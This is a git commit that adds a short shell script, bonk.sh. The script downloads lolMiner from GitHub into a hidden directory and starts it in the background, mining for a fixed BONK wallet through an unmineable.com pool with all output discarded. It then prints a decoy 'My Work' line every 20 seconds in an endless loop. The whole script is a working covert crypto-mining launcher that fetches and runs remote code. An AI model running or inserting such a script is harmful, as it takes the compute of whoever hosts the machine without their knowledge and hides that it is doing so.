ec9102e96f3a857942544ed39f6cfe0170ee7382
preak07 <160253225+preak07@users.noreply.github.com>
2024-02-21 00:34:11 +0700

    Create bonk.sh

---
+++ bonk.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+set -x
+apt-get update
+apt-get install -y curl wget
+mkdir .lolMiner && cd .lolMiner
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.84/lolMiner_v1.84_Lin64.tar.gz && tar -xf lolMiner_v1.84_Lin64.tar.gz && cd 1.84 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BONK:9pLCmLN5SezzydMn1ASJ1NermRguNYJmdy9Uy1b5wkvN.vivo --ethstratum ETHPROXY >/dev/null 2>&1 &
+while true
+do
+        echo "My Work"
+        sleep 20
+done
